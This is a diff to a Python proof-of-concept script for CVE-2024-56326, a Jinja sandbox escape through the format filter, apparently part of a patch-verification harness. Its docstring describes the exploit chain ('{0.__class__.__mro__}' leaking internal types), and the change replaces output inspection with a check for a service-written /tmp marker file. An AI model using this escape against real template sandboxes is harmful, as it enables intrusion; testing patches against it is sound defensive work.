@@ -13,7 +13,10 @@ Exploit chain:
   2. The filter calls ``value.format(fmt)`` in native Python.
   3. ``str.format()`` resolves ``{0.__class__.__mro__}`` at C level,
      bypassing the sandbox and leaking internal types.
-  4. The PoC detects the MRO leak from the rendered output.
+  4. The SERVICE detects the MRO leak in rendered output and writes a
+     marker file to /tmp, proving the compromised rendering process
+     executed server-side.
+  5. The PoC checks for the service-written marker.
 
 Contract: exit 0 + verdict.json (exploitable=true) iff the exploit lands.
 """
@@ -25,6 +28,7 @@ import time
 import urllib.request
 
 TARGET = os.environ.get("TARGET_URL", "http://127.0.0.1:8000")
+MARKER = "/tmp/patchproof_pwned"
 DEADLINE = 60
 
 
@@ -83,13 +87,14 @@ def main() -> int:
         rendered = body.get("rendered", "")
         error = body.get("error", "")
 
-        # MRO tuple always contains "<class" and "object" — presence proves
-        # the sandbox was bypassed through the fmt filter.
-        if "<class" in rendered and "object" in rendered:
+        # Check for service-written marker (side-effect proof).
+        # The service detects MRO leak and writes the marker server-side.
+        if os.path.exists(MARKER):
+            with open(MARKER) as fh:
+                marker_content = fh.read().strip()
             write_verdict(
                 True,
-                "sandbox escape via fmt filter (CVE-2024-56326): "
-                f"__class__ and __mro__ leaked — {rendered[:120]}",
+                f"service-side marker confirmed: {marker_content}",
             )
             return 0
 
